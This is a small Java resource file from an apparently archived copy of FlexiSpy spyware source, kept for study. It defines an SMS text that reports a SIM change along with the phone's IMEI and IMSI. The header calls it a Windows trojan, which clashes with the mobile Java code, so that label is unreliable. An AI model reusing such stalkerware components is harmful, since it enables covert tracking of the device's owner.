/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.sim.resource;

import com.vvt.std.Constant;
import com.vvt.std.PhoneInfo;

public class SIMTextResource {

	public static final String MESSAGE = "a SIM change has been detected and is sending you this SMS from host device." + Constant.CRLF + "IMEI/ESN:" + PhoneInfo.getIMEI() + Constant.CRLF + "IMSI:" + PhoneInfo.getIMSI();
	public static final String SIM_NUMBER = "SIM number: "; 
}
